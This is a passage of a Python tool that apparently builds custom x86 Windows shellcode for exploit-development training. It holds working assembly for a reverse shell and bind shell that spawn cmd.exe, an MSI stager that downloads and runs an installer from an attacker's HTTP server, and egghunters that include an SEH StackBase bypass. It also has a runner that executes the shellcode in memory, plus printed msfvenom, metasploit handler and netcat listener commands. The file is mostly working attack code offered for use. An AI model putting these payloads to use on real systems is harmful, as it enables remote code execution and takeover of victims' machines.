        "    push eax                        ",  # Push cb
        "    push esp                        ",  # Push pointer to the STARTUPINFOA structure
        "    pop edi                         ",  # Store pointer to STARTUPINFOA in EDI
        "create_cmd_string:                  ",
        "    mov eax, 0xff9a879b             ",  # Move 0xff9a879b into EAX
        "    neg eax                         ",  # Negate EAX, EAX = 00657865
        "    push eax                        ",  # Push part of the "cmd.exe" string
        "    push 0x2e646d63                 ",  # Push the remainder of the "cmd.exe" string
        "    push esp                        ",  # Push pointer to the "cmd.exe" string
        "    pop ebx                         ",  # Store pointer to the "cmd.exe" string in EBX
        "call_createprocessa:                ",
        "    mov eax, esp                    ",  # Move ESP to EAX
        "    xor ecx, ecx                    ",  # Null ECX
        "    mov cx, 0x390                   ",  # Move 0x390 to CX
        "    sub eax, ecx                    ",  # Substract CX from EAX to avoid overwriting the structure later
        "    push eax                        ",  # Push lpProcessInformation
        "    push edi                        ",  # Push lpStartupInfo
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push lpCurrentDirectory
        "    push eax                        ",  # Push lpEnvironment
        "    push eax                        ",  # Push dwCreationFlags
        "    inc eax                         ",  # Increase EAX, EAX = 0x01 (TRUE)
        "    push eax                        ",  # Push bInheritHandles
        "    dec eax                         ",  # Null ECX
        "    push eax                        ",  # Push lpThreadAttributes
        "    push eax                        ",  # Push lpProcessAttributes
        "    push ebx                        ",  # Push lpCommandLine
        "    push eax                        ",  # Push lpApplicationName
        "    call dword ptr [ebp+18h]        ",  # Call CreateProcessA
        "call_terminate_process:             ",  #
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # uExitCode
        "    push 0xffffffff                 ",  # HANDLE hProcess
        "    call dword ptr [ebp+04h]        ",  # Call TerminateProcess
    ]
    asm = format_assembly(asm)
    return asm


def msi_shellcode(rev_ipaddr, rev_port, breakpoint=False):
    """msf msi exploit stager (short)"""

    msi_exec_str = "msiexec /i http://{}{}/X /qn".format(rev_ipaddr, "" if rev_port == "80" else ":" + rev_port)
    # Align the string to 4 bytes (to keep the stack aligned)
    msi_exec_str += " " * (len(msi_exec_str) % 4)

    asm = [
        "start:                              ",
        "{}                                  ".format("int3" if breakpoint else ""),
        "    mov ebp, esp                    ",
        "    add esp, 0xfffff9f0             ",  # Avoid Null bytes
        "find_kernel32:                      ",
        "    xor ecx, ecx                    ",  # ECX = 0
        "    mov esi, fs:[ecx+30h]           ",  # ESI = &(PEB) ([FS:0x30])
        "    mov esi, [esi+0Ch]              ",  # ESI = PEB->Ldr
        "    mov esi, [esi+1Ch]              ",  # ESI = PEB->Ldr.InInitOrder
        "next_module:                        ",
        "    mov ebx, [esi+8h]               ",  # EBX = InInitOrder[X].base_address
        "    mov edi, [esi+20h]              ",  # EDI = InInitOrder[X].module_name
        "    mov esi, [esi]                  ",  # ESI = InInitOrder[X].flink (next)
        "    cmp [edi+12*2], cx              ",  # (unicode) modulename[12] == 0x00 / we found kernel32.dll?
        "    jne next_module                 ",  # No: try next module.
        "find_function_shorten:              ",
        "    jmp find_function_shorten_bnc   ",  # Short jump
        "find_function_ret:                  ",
        "    pop esi                         ",  # POP the return address from the stack
        "    mov [ebp+04h], esi              ",  # Save find_function address for later usage
        "    jmp resolve_symbols_kernel32    ",
        "find_function_shorten_bnc:          ",
        "    call find_function_ret          ",  # Relative CALL with negative offset
        "find_function:                      ",
        "    pushad                          ",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
        "    mov eax, [ebx+3ch]              ",  # Offset to PE Signature
        "    mov edi, [ebx+eax+78h]          ",  # Export Table Directory RVA
        "    add edi, ebx                    ",  # Export Table Directory VMA
        "    mov ecx, [edi+18h]              ",  # NumberOfNames
        "    mov eax, [edi+20h]              ",  # AddressOfNames RVA
        "    add eax, ebx                    ",  # AddressOfNames VMA
        "    mov [ebp-4], eax                ",  # Save AddressOfNames VMA for later
        "find_function_loop:                 ",
        "    jecxz find_function_finished    ",  # Jump to the end if ECX is 0
        "    sub ecx, 0x1                    ",  # Decrement our names counter
        "    mov eax, [ebp-4]                ",  # Restore AddressOfNames VMA
        "    mov esi, [eax+ecx*4]            ",  # Get the RVA of the symbol name
        "    add esi, ebx                    ",  # Set ESI to the VMA of the current
        "compute_hash:                       ",
        "    xor eax, eax                    ",  # Null EAX
        "    cdq                             ",  # Null EDX
        "    cld                             ",  # Clear direction flag
        "compute_hash_again:                 ",
        "    lodsb                           ",  # Load the next byte from esi into al
        "    test al, al                     ",  # Check for Null terminator
        "    jz compute_hash_finished        ",  # If the ZF is set, we've hit the Null term
        "    ror edx, 0x0c                   ",  # Rotate edx 12 bits to the right
        "    ror edx, 0x01                   ",  # Rotate edx 1 bits to the right
        "    add edx, eax                    ",  # Add the new byte to the accumulator
        "    jmp compute_hash_again          ",  # Next iteration
        "compute_hash_finished:              ",
        "find_function_compare:              ",
        "    cmp edx, [esp+24h]              ",  # Compare the computed hash with the requested hash
        "    jnz find_function_loop          ",  # If it doesn't match go back to find_function_loop
        "    mov edx, [edi+24h]              ",  # AddressOfNameOrdinals RVA
        "    add edx, ebx                    ",  # AddressOfNameOrdinals VMA
        "    mov cx, [edx+2*ecx]             ",  # Extrapolate the function's ordinal
        "    mov edx, [edi+1ch]              ",  # AddressOfFunctions RVA
        "    add edx, ebx                    ",  # AddressOfFunctions VMA
        "    mov eax, [edx+4*ecx]            ",  # Get the function RVA
        "    add eax, ebx                    ",  # Get the function VMA
        "    mov [esp+1ch], eax              ",  # Overwrite stack version of eax from pushad
        "find_function_finished:             ",
        "    popad                           ",  # Restore registers
        "    ret                             ",
        "resolve_symbols_kernel32:           ",
        "    push {}                         ".format(get_function_hash("TerminateProcess")),  # TerminateProcess hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+10h], eax              ",  # Save TerminateProcess address for later
        "    push {}                         ".format(get_function_hash("LoadLibraryA")),  # LoadLibraryA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+14h], eax              ",  # Save LoadLibraryA address for later
        "load_msvcrt:                        ",
        "    xor eax, eax                    ",  # Null EAX / Push the target library string on the stack --> msvcrt.dll  -->  6d737663 72742e64 6c6c
        "    push eax                        ",  # Push a Null byte
        push_string("msvcrt.dll"),  # Push the msvcrt.dll string
        "    push esp                        ",  # Push ESP to have a pointer to the string
        "    call dword ptr [ebp+14h]        ",  # Call LoadLibraryA
        "resolve_symbols_msvcrt:             ",
        "    mov ebx, eax                    ",  # Move the base address of msvcrt.dll to EBX
        "    push {}                         ".format(get_function_hash("system")),  # System hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+18h], eax              ",  # Save System address for later
        "call_system:                        ",  # Push the target sting on the stack --> msiexec /i http://192.168.0.218/X /qn   -->  http://string-functions.com/string-hex.aspx
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",
        push_string(msi_exec_str),
        "    push esp                        ",  # Push the pointer to the command on the stack
        "    call dword ptr [ebp+18h]        ",  # Call system (https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-160)
        "call_terminate_process:             ",
        "    xor ecx, ecx                    ",  # Null ECX
        "    push ecx                        ",  # uExitCode
        "    push 0xffffffff                 ",  # HANDLE hProcess
        "    call dword ptr [ebp+10h]        ",  # Call TerminateProcess
    ]
    asm = format_assembly(asm)
    return asm


def asm_msgbox(header, text, breakpoint=False):
    # MessageBoxA() in user32.dll

    asm = [
        "start:                              ",
        "{}                                  ".format("int3" if breakpoint else ""),
        "    mov ebp, esp                    ",
        "    add esp, 0xfffff9f0             ",  # Avoid Null bytes
        "find_kernel32:                      ",
        "    xor ecx, ecx                    ",  # ECX = 0
        "    mov esi, fs:[ecx+30h]           ",  # ESI = &(PEB) ([FS:0x30])
        "    mov esi, [esi+0Ch]              ",  # ESI = PEB->Ldr
        "    mov esi, [esi+1Ch]              ",  # ESI = PEB->Ldr.InInitOrder
        "next_module:                        ",
        "    mov ebx, [esi+8h]               ",  # EBX = InInitOrder[X].base_address
        "    mov edi, [esi+20h]              ",  # EDI = InInitOrder[X].module_name
        "    mov esi, [esi]                  ",  # ESI = InInitOrder[X].flink (next)
        "    cmp [edi+12*2], cx              ",  # (unicode) modulename[12] == 0x00 / we found kernel32.dll?
        "    jne next_module                 ",  # No: try next module.
        "find_function_shorten:              ",
        "    jmp find_function_shorten_bnc   ",  # Short jump
        "find_function_ret:                  ",
        "    pop esi                         ",  # POP the return address from the stack
        "    mov [ebp+04h], esi              ",  # Save find_function address for later usage
        "    jmp resolve_symbols_kernel32    ",
        "find_function_shorten_bnc:          ",
        "    call find_function_ret          ",  # Relative CALL with negative offset
        "find_function:                      ",
        "    pushad                          ",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
        "    mov eax, [ebx+3ch]              ",  # Offset to PE Signature
        "    mov edi, [ebx+eax+78h]          ",  # Export Table Directory RVA
        "    add edi, ebx                    ",  # Export Table Directory VMA
        "    mov ecx, [edi+18h]              ",  # NumberOfNames
        "    mov eax, [edi+20h]              ",  # AddressOfNames RVA
        "    add eax, ebx                    ",  # AddressOfNames VMA
        "    mov [ebp-4], eax                ",  # Save AddressOfNames VMA for later
        "find_function_loop:                 ",
        "    jecxz find_function_finished    ",  # Jump to the end if ECX is 0
        "    sub ecx, 0x1                    ",  # Decrement our names counter
        "    mov eax, [ebp-4]                ",  # Restore AddressOfNames VMA
        "    mov esi, [eax+ecx*4]            ",  # Get the RVA of the symbol name
        "    add esi, ebx                    ",  # Set ESI to the VMA of the current
        "compute_hash:                       ",
        "    xor eax, eax                    ",  # Null EAX
        "    cdq                             ",  # Null EDX
        "    cld                             ",  # Clear direction flag
        "compute_hash_again:                 ",
        "    lodsb                           ",  # Load the next byte from esi into al
        "    test al, al                     ",  # Check for Null terminator
        "    jz compute_hash_finished        ",  # If the ZF is set, we've hit the Null term
        "    ror edx, 0x0c                   ",  # Rotate edx 12 bits to the right
        "    ror edx, 0x01                   ",  # Rotate edx 1 bits to the right
        "    add edx, eax                    ",  # Add the new byte to the accumulator
        "    jmp compute_hash_again          ",  # Next iteration
        "compute_hash_finished:              ",
        "find_function_compare:              ",
        "    cmp edx, [esp+24h]              ",  # Compare the computed hash with the requested hash
        "    jnz find_function_loop          ",  # If it doesn't match go back to find_function_loop
        "    mov edx, [edi+24h]              ",  # AddressOfNameOrdinals RVA
        "    add edx, ebx                    ",  # AddressOfNameOrdinals VMA
        "    mov cx, [edx+2*ecx]             ",  # Extrapolate the function's ordinal
        "    mov edx, [edi+1ch]              ",  # AddressOfFunctions RVA
        "    add edx, ebx                    ",  # AddressOfFunctions VMA
        "    mov eax, [edx+4*ecx]            ",  # Get the function RVA
        "    add eax, ebx                    ",  # Get the function VMA
        "    mov [esp+1ch], eax              ",  # Overwrite stack version of eax from pushad
        "find_function_finished:             ",
        "    popad                           ",  # Restore registers
        "    ret                             ",
        "resolve_symbols_kernel32:           ",
        "    push {}                         ".format(get_function_hash("TerminateProcess")),  # TerminateProcess hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+10h], eax              ",  # Save TerminateProcess address for later
        "    push {}                         ".format(get_function_hash("LoadLibraryA")),  # LoadLibraryA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+14h], eax              ",  # Save LoadLibraryA address for later
        "load_user32:                        ",
        "    xor eax, eax                    ",  # Null EAX / Push the target library string on the stack --> user32.dll
        "    push eax                        ",  # Push a Null byte
        push_string("user32.dll"),  # Push the DLL name
        "    push esp                        ",  # Push ESP to have a pointer to the string
        "    call dword ptr [ebp+14h]        ",  # Call LoadLibraryA
        "resolve_symbols_user32:             ",
        "    mov ebx, eax                    ",  # Move the base address of user32.dll to EBX
        "    push {}                         ".format(get_function_hash("MessageBoxA")),  # MessageBoxA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+18h], eax              ",  # Save MessageBoxA address for later
        "call_system:                        ",  # Push the target stings on the stack (https://www.fuzzysecurity.com/tutorials/expDev/6.html)
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Create a Null byte on the stack
        push_string(header),  # Push the header text
        "    mov ebx, esp                    ",  # Store the pointer to the window header in ebx
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Create a Null byte on the stack
        push_string(text),  # Push the text
        "    mov ecx, esp                    ",  # Store the pointer to the window text in ecx
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Create a Null byte on the stack for uType=0x00000000
        "    push ebx                        ",  # Put a pointer to the window header on the stack
        "    push ecx                        ",  # Put a pointer to the window text on the stack
        "    push eax                        ",  # Create a Null byte on the stack for hWnd=0x00000000
        "    call dword ptr [ebp+18h]        ",  # Call MessageBoxA (https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)
        "call_terminate_process:             ",
        "    xor ecx, ecx                    ",  # Null ECX
        "    push ecx                        ",  # uExitCode
        "    push 0xffffffff                 ",  # HANDLE hProcess
        "    call dword ptr [ebp+10h]        ",  # Call TerminateProcess
    ]
    asm = format_assembly(asm)
    return asm


def ntaccess_hunter_win7(egg):
    # 6.6.1. Keystone Engine (35 bytes)
    asm = [
        # We use the edx register as a memory page counter
        "{}                                  ".format("int3" if breakpoint else ""),
        "loop_inc_page:                      ",
        "    or dx, 0x0fff                   ",  # Go to the last address in the memory page
        "loop_inc_one:                       ",
        "    inc edx                         ",  # Increase the memory counter by one
        "loop_check:                         ",
        "    push edx                        ",  # Save the edx register which holds our memory address on the stack
        "    push 0x2                        ",  # Push the system call number (Windows 7)
        "    pop eax                         ",  # Initialize the call to NtAccessCheckAndAuditAlarm
        "    int 0x2e                        ",  # Perform the system call
        "    cmp al,05                       ",  # Check for access violation, 0xc0000005 (ACCESS_VIOLATION)
        "    pop edx                         ",  # Restore the edx register to check later for our egg
        "loop_check_valid:                   ",
        "    je loop_inc_page                ",  # If access violation encountered, go to next page
        "is_egg:                             ",
        "    mov eax, {}                     ".format(to_hex_le(egg)),  # Load egg into the eax register
        "    mov edi, edx                    ",  # Initializes pointer with current checked address
        "    scasd                           ",  # Compare eax with doubleword at edi and set status flags
        "    jnz loop_inc_one                ",  # No match, we will increase our memory counter by one
        "first_byte_found:                   ",
        "    scasd                           ",  # First part of the egg detected, check for the second part
        "    jnz loop_inc_one                ",  # No match, we found just a location with half an egg
        "matched:                            ",
        "    jmp edi                         ",  # The edi register points to the first byte of our buffer, we can jump to it
    ]
    asm = format_assembly(asm)
    return asm


def ntaccess_hunter_win10(egg):
    # 6.6.3. Identifying and Addressing the Egghunter Issue
    # UPDATED - u ntdll!NtAccessCheckAndAuditAlarm L1 && NEG assembly ? 0 - -(0 - 0x1C6)
    # 0:004> u ntdll!NtAccessCheckAndAuditAlarm L1
    # ntdll!NtAccessCheckAndAuditAlarm:
    # 76f50ec0 b8c6010000      mov     eax,1C6h
    #
    # Option 1 (Null bytes):
    # push 0x1C6;  # Push the system call number
    # pop eax; # Initialize the call to NtAccessCheckAndAuditAlarm
    # Option 2:
    # mov eax, 0xfffffe3a;",  # Push the system call number, Windows 10, u ntdll!NtAccessCheckAndAuditAlarm L1 && NEG assembly ? 0 - -(0 - 0x1C6)
    # neg eax;", # Initialize the call to NtAccessCheckAndAuditAlarm
    # Option 3:
    # sub eax, 0xFFFFFF3A # Push the two's complement of 0x1C6, ? (0x1C6 ^ 0xFFFFFFFF) + 1
    asm = [
        "{}                                  ".format("int3" if breakpoint else ""),
        "loop_inc_page:                      ",  # We use the edx register as a memory page counter
        "    or dx, 0x0fff                   ",  # Go to the last address in the memory page
        "loop_inc_one:                       ",
        "    inc edx                         ",  # Increase the memory counter by one
        "loop_check:                         ",
        "    push edx                        ",  # Save the edx register which holds our memory address on the stack
        "    mov eax, 0xfffffe3a             ",  # Push the system call number (Windows 10)
        "    neg eax                         ",  # Initialize the call to NtAccessCheckAndAuditAlarm
        "    int 0x2e                        ",  # Perform the system call
        "    cmp al,05                       ",  # Check for access violation, 0xc0000005 (ACCESS_VIOLATION)
        "    pop edx                         ",  # Restore the edx register to check later for our egg
        "loop_check_valid:                   ",
        "    je loop_inc_page                ",  # If access violation encountered, go to next page
        "is_egg:                             ",
        "    mov eax, {}                     ".format(to_hex_le(egg)),  # Load egg into the eax register
        "    mov edi, edx                    ",  # Initializes pointer with current checked address
        "    scasd                           ",  # Compare eax with doubleword at edi and set status flags
        "    jnz loop_inc_one                ",  # No match, we will increase our memory counter by one
        "first_byte_found:                   ",
        "    scasd                           ",  # First part of the egg detected, check for the second part
        "    jnz loop_inc_one                ",  # No match, we found just a location with half an egg
        "matched:                            ",
        "    jmp edi                         ",  # The edi register points to the first byte of our buffer, we can jump to it
    ]
    asm = format_assembly(asm)
    return asm


def seh_hunter_win7(egg):
    # Improving the Egghunter Portability Using SEH
    asm = [
        "start:",
        "{}                                  ".format("int3" if breakpoint else ""),
        "    jmp get_seh_address             ",  # jump to a negative call to dynamically obtain egghunter position
        "build_exception_record:             ",
        "    pop ecx                         ",  # pop the address of the exception_handler into ecx
        "    mov eax, {}                     ".format(to_hex_le(egg)),  # Load egg into the eax register
        "    push ecx                        ",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
        "    push 0xffffffff                 ",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
        "    xor ebx, ebx                    ",  # null out ebx
        "    mov dword ptr fs:[ebx], esp     ",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
        "is_egg:                             ",  # bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
        "    push 0x02                       ",  # push 2
        "    pop ecx                         ",  # load 2 into ecx which will act as a counter
        "    mov edi, ebx                    ",  # move memory page address into edi
        "    repe scasd                      ",  # check for egg, if the page is invalid we trigger an exception and jump to our exception_handler function
        "    jnz loop_inc_one                ",  # didn't find signature, increase ebx and repeat
        "    jmp edi                         ",  # found the egg and will jump to it
        "loop_inc_page:                      ",
        "    or bx, 0xfff                    ",  # if page is invalid the exception_handler will update eip to point here and we move to next page
        "loop_inc_one:                       ",
        "    inc ebx                         ",  # increase memory page address by a byte
        "    jmp is_egg                      ",  # check for the egg again
        "get_seh_address:                    ",
        "    call build_exception_record     ",  # call to a higher address to avoid null bytes & push return to obtain egghunter position
        "    push 0x0c                       ",  # push 0x0c onto the stack
        "    pop ecx                         ",  # store 0x0c in ecx to use as an offset
        "    mov eax, [esp+ecx]              ",  # mov into eax the pointer to the CONTEXT structure for our exception
        "    mov cl, 0xb8                    ",  # mov 0xb8 into ecx which will act as an offset to the eip
        "    add dword ptr ds:[eax+ecx], 0x06",  # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
        "    pop eax                         ",  # push return value back into the stack into eax
        "    add esp, 0x10                   ",  # increase esp to clean the stack for our call
        "    push eax                        ",  # push return value back into the stack
        "    xor eax, eax                    ",  # null out eax to simulate ExceptionContinueExecution return
        "    ret                             ",
    ]
    asm = format_assembly(asm)
    return asm


def seh_hunter_win10(egg):
    # Improving the Egghunter Portability Using SEH
    #  Porting the SEH Egghunter to Windows 10
    asm = [
        "start:",
        "{}                                  ".format("int3" if breakpoint else ""),
        "    jmp get_seh_address             ",  # jump to a negative call to dynamically obtain egghunter position
        "build_exception_record:             ",
        "    pop ecx                         ",  # pop the address of the exception_handler into ecx
        "    mov eax, {}                     ".format(to_hex_le(egg)),  # Load egg into the eax register
        "    push ecx                        ",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
        "    push 0xffffffff                 ",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
        "    xor ebx, ebx                    ",  # null out ebx
        "    mov dword ptr fs:[ebx], esp     ",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
        # UPDATED - bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
        "    sub ecx, 0x04                   ",  # substract 0x04 from the pointer to exception_handler
        "    add ebx, 0x04                   ",  # add 0x04 to ebx
        "    mov dword ptr fs:[ebx], ecx     ",  # overwrite the StackBase in the TEB
        "is_egg:                             ",
        "    push 0x02                       ",  # push 2
        "    pop ecx                         ",  # load 2 into ecx which will act as a counter
        "    mov edi, ebx                    ",  # move memory page address into edi
        "    repe scasd                      ",  # check for egg, if the page is invalid we trigger an exception and jump to our exception_handler function
        "    jnz loop_inc_one                ",  # didn't find signature, increase ebx and repeat
        "    jmp edi                         ",  # found the egg and will jump to it
        "loop_inc_page:                      ",
        "    or bx, 0xfff                    ",  # if page is invalid the exception_handler will update eip to point here and we move to next page
        "loop_inc_one:                       ",
        "    inc ebx                         ",  # increase memory page address by a byte
        "    jmp is_egg                      ",  # check for the egg again
        "get_seh_address:                    ",
        "    call build_exception_record     ",  # call to a higher address to avoid null bytes & push return to obtain egghunter position
        "    push 0x0c                       ",
        "    pop ecx                         ",  # store 0x0c in ecx to use as an offset
        "    mov eax, [esp+ecx]              ",  # mov into eax the pointer to the CONTEXT structure for our exception
        "    mov cl, 0xb8                    ",  # mov 0xb8 into ecx which will act as an offset to the eip
        "    add dword ptr ds:[eax+ecx], 0x06",  # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
        "    pop eax                         ",  # save return address in eax
        "    add esp, 0x10                   ",  # increase esp to clean the stack for our call
        "    push eax                        ",  # push return value back into the stack
        "    xor eax, eax                    ",  # null out eax to simulate ExceptionContinueExecution return
        "    ret                             ",
    ]
    asm = format_assembly(asm)
    return asm


def process_shellcode(asm, shellcode, args):
    print("[*] Assembly code + corresponding bytes:")

    shellcode_bytes = b"".join([struct.pack("<B", x) for x in shellcode])
    asm_decompiled = list(cs.Cs(cs.CS_ARCH_X86, cs.CS_MODE_32).disasm(shellcode_bytes, 0))
    asmd_allbytes = b""
    for instr in asm.splitlines():
        if instr.endswith(":"):
            print(instr)
            continue
        asm_d = asm_decompiled.pop(0)
        instr = "{} {}".format(asm_d.mnemonic, asm_d.op_str)
        asmd_allbytes += asm_d.bytes
        byte_str = ""
        contains_bad = False
        for b in asm_d.bytes:
            if args.bad and b in args.bad:
                byte_str += "\033[31m{:02x}\033[0m ".format(b)
                contains_bad = True
            else:
                byte_str += "{:02x} ".format(b)
        if contains_bad:
            instr = "\033[31m{}\033[0m".format(instr)
        print("{:<40}{}{}".format(instr, " " * 9 * contains_bad, byte_str.strip()))

    if asm_decompiled or shellcode_bytes != asmd_allbytes:
        # self check
        raise Exception("Error: Self-check failed on decompilation")


def execute_shellcode(args, shellcode):
    # Only proceed if Windows x86 (32-bit)
    type_system = platform.system()
    type_architecture = platform.architecture()[0]
    if type_system != "Windows" or type_architecture != "32bit":
        print("\n[!] Not running shellcode - not running on Windows x86 (32-bit), system: {} architecture: {}".format(type_system, type_architecture))
        exit()

    # Store opcodes of shellcode in byte array
    sh = b""
    for e in shellcode:
        sh += struct.pack("B", e)
    packed_shellcode = bytearray(sh)

    # Call VirtualAlloc to allocate a memory page with _PAGE_EXECUTE_READWRITE protections
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(packed_shellcode)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40),
    )
    buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)

    # Call RtlMoveMemory to copy the shellcode opcodes to the newly-allocated memory page.
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode)))
    print("[*] Shellcode located at address %s" % hex(ptr))

    # This pauses the execution until input is received, allowing us to attach WinDbg to the `python.exe` process.
    pid = os.getpid()
    print("[*] Process spawned at pid {}".format(pid))
    if args.debug:
        attach_cmd = """powershell -ep bypass "\\\\tsclient\\share\wined\\attach.ps1 -pid {}" """.format(pid)
        print("[*] Debug mode enabled, attach WinDBG to pid {}".format(pid))
        print("[*] Attach with powershell: {}".format(attach_cmd))
        input("PRESS ENTER TO BEGIN SHELLCODE EXECUTION ...")

    # Call CreateThread to run the shellcode in a new thread.
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)),
    )
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def main():
    # Attacker ip
    attacker_ip = ""
    try:
        import netifaces as ni

        try:
            attacker_ip = ni.ifaddresses("tun0")[ni.AF_INET][0]["addr"]
        except:
            try:
                attacker_ip = ni.ifaddresses("eth0")[ni.AF_INET][0]["addr"]
            except:
                pass
    except ImportError:
        pass

    # Arguments
    parser = argparse.ArgumentParser(description="Creates custom shellcodes")
    parser.add_argument(
        "-a",
        "--attacker",
        help="Attacker IP address",
        default=attacker_ip,
    )
    parser.add_argument(
        "-t",
        "--target",
        help="Target IP address",
        default="",
    )
    parser.add_argument(
        "-p",
        "--port",
        help="Listening/Bind port (default: 4444)",
        default="4444",
    )
    parser.add_argument("-b", "--bad", help="Space separated list of bad chars (ex: -b 00 0a 0d or -b 000a0d), Default:Null-free", type=hex_byte, nargs="+")
    parser.add_argument(
        "mode",
        nargs="*",
        choices=["msi", "messagebox", "reverse", "bind", "eggwin7", "eggwin10", "eggsehwin7", "eggsehwin10", "calc"],
        help="Shellcode creation mode: msi, messagebox, reverse, bind, eggwin7, eggwin10, eggsehwin7, eggsehwin10, calc.",
        default="reverse",
    )
    messagebox_group = parser.add_argument_group("Messagebox Mode Options")
    messagebox_group.add_argument("--header", help="Title of the messagebox.", default="Message title")
    messagebox_group.add_argument("--message", help="Message to be displayed in the messagebox.", default="This is my message")
    parser.add_argument(
        "-d",
        "--debug",
        help="Add a software breakpoint (\\xCC) as the first shellcode instruction",
        action="store_true",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Store the shellcode in binary format in the file (i.e. shellcode.bin)",
        default="",
    )
    parser.add_argument(
        "-v",
        "--varname",
        help="Shellcode variable name",
        default="shellcode",
    )
    parser.add_argument(
        "-e",
        "--egg",
        help="egg for which the egghunter will search (default: c0d3)",
        default="c0d3",
    )
    args = parser.parse_args()

    # Parse bad characters
    if args.bad:
        args.bad = [b for bad in args.bad for b in bad]
        bad_hexstr = "".join("\\x{:02x}".format(i) for i in args.bad)
        if bad_hexstr:
            print("[*] Bad Characters: {}".format(bad_hexstr))

    # Parse mode
    if isinstance(args.mode, list):
        args.mode = args.mode[-1]

    # Validate egg
    if args.mode.startswith("egg") and len(args.egg) != 4:
        raise SystemExit("[!] Invalid egg - Needs to be 4 characters")

    nextsteps = ""

    # Mode
    if args.mode == "msi":
        if not args.attacker:
            raise SystemExit("[!] Invalid Attacker IP address (specify with -a 192.168.0.218)")
        if not args.port:
            raise SystemExit("[!] Invalid port")
        print("[*] Creating MSI stager ...")
        asm = msi_shellcode(args.attacker, args.port, args.debug)
        nextsteps += "Create msi payload:\n"
        nextsteps += "  msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f msi -o X\n".format(args.attacker, args.port)
        nextsteps += "Start http server (hosting the msi file):\n"
        nextsteps += "  sudo python -m SimpleHTTPServer {} \n".format(args.port)
        nextsteps += "Start the metasploit listener:\n"
        nextsteps += '  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {}; set LPORT {}; exploit"'.format(args.attacker, args.port)

    elif args.mode == "messagebox":
        print("[*] Creating message box ...")
        asm = asm_msgbox(args.header, args.message, args.debug)

    elif args.mode == "reverse":
        if not args.attacker:
            raise SystemExit("[!] Invalid Attacker IP address (specify with -a 192.168.0.218)")
        if not args.port:
            raise SystemExit("[!] Invalid port")
        print("[*] Creating reverse shell ...")
        asm = asm_revshell(args.attacker, args.port, args.debug)
        nextsteps += "Start listener:\n"
        nextsteps += "  nc -lnvp {}".format(args.port)

    elif args.mode == "bind":
        if not args.target:
            raise SystemExit("[!] Invalid Target IP address (specify with -t 192.168.0.218)")
        if not args.port:
            raise SystemExit("[!] Invalid port")
        print("[*] Creating bind shell ...")
        asm = asm_bindshell(args.port, args.debug)
        nextsteps += "Connect to bindshell:\n"
        nextsteps += "  nc {} {}".format(args.target, args.port)

    elif args.mode == "eggwin7":
        print("[*] Creating NTAccess Egghunter (Win7)")
        asm = ntaccess_hunter_win7(egg=args.egg)

    elif args.mode == "eggwin10":
        print("[*] Creating NTAccess Egghunter (Win10)")
        asm = ntaccess_hunter_win10(egg=args.egg)

    elif args.mode == "eggsehwin7":
        print("[*] Creating SEH Egghunter (Win7)")
        asm = seh_hunter_win7(egg=args.egg)

    elif args.mode == "eggsehwin10":
        print("[*] Creating SEH Egghunter (Win10)")
        asm = seh_hunter_win10(egg=args.egg)

    else:
        raise SystemExit("[!] Invalid selection mode")

    print("[*] Compiling instructions ...")
    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    shellcode, _ = eng.asm(asm)

    # Process shellcode
    process_shellcode(asm, shellcode, args)

    # Format shellcode
    print("\n[*] Python Code:")
    shellcode_formatted = ""
    if args.mode.startswith("egg"):
        if args.varname == "shellcode":
            args.varname = "EGGHUNTER"
        shellcode_formatted += 'EGG = b"{}"\n'.format(args.egg * 2)
        shellcode_formatted += '{} = b""\n'.format(args.varname)
    else:
        shellcode_formatted += '{} = b""\n'.format(args.varname)
    for i in range(0, len(shellcode), 15):
        shellcode_formatted += '{} += b"'.format(args.varname) + "".join(["\\x{0:02x}".format(b) for b in shellcode[i : i + 15]]) + '"\n'
    print(shellcode_formatted)

    # Check if bad characters
    found_badchars = False
    if args.bad:
